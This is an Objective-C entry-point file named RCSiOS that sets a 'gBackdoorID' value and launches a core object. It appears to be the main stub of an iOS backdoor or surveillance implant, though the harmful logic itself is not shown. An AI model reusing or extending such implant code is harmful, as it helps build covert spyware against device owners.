/*
 * RCSiOS
 *  pon pon
 *
 * Created on 08/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Foundation/Foundation.h>

#import "RCSICore.h"
#import "RCSIConfManager.h"
#import "RCSICommon.h"
#import "RCSITaskManager.h"
#import "RCSILogger.h"
#import "RCSIDebug.h"


int main (int argc, const char * argv[])
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // FIXED- fixing string binary patched
  gBackdoorID[14] = gBackdoorID[15] = 0;
  
  int shMemSize = SHMEM_COMMAND_MAX_SIZE;
  
  RCSICore *core = [[RCSICore alloc] initWithShMemorySize: shMemSize];

  [core runMeh];
  
  [pool release];
  [core release];
  return 0;
}
